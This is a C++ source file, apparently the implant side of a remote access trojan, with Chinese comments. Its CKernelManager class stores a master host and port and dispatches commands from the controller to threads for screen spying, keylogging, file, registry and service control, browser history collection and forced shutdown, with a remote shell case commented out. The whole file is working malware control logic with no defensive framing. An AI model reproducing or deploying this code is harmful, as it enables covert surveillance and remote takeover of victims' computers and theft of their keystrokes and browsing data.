// KernelManager.cpp: implementation of the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "KernelManager.h"
#include "Loop.h"
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
char	CKernelManager::m_strMasterHost[256] = { 0 };
UINT	CKernelManager::m_nMasterPort = 80;

CKernelManager::CKernelManager(CClientSocket *pClient,
	LPCSTR lpszMasterHost, UINT nMasterPort) : CManager(pClient)
{
	if (lpszMasterHost != NULL)
		strcpy(m_strMasterHost, lpszMasterHost);

	m_nMasterPort = nMasterPort;
	m_nThreadCount = 0;
}

CKernelManager::~CKernelManager()
{
	for (UINT i = 0; i < m_nThreadCount; i++)
	{
		TerminateThread(m_hThread[i], -1);
		CloseHandle(m_hThread[i]);
	}
}

void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{

	switch (lpBuffer[0])
	{
	case COMMAND_LIST_DRIVE: // 文件管理
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_FileManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL, false);
		break;
	case COMMAND_SCREEN_SPY: // 屏幕查看
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ScreenManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
		break;
	case COMMAND_SYSTEM://系统管理
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SystemManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_KEYBOARD: //键盘记录
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_KeyboardManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
// 	case COMMAND_SHELL: // 远程终端
// 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ShellManager,
// 			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
// 		break;
	case COMMAND_SERVICE_MANAGER://服务管理
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ServiceManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_REGEDIT://注册表管理
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_RegeditManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_URL_HISTORY://浏览记录
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_UrlManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_MESSAGEBOX://弹窗
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_Messagebox,
			(LPVOID)(lpBuffer + 1), 0, NULL, true);
		break;
	case COMMAND_CHANGE_GROUP://更改分组
		SetHostID((LPCTSTR)(lpBuffer + 1), TRUE);
		break;
	case COMMAND_RENAME_REMARK://更改备注
		SetHostID((LPCTSTR)(lpBuffer + 1), FALSE);
		break;
	case COMMAND_SESSION://会话管理
		ShutdownWindows(lpBuffer[1]);
		break;
	case COMMAND_UNINSTALL://卸载主机
		UninstallService();
		break;
	default:
		break;
	}
}


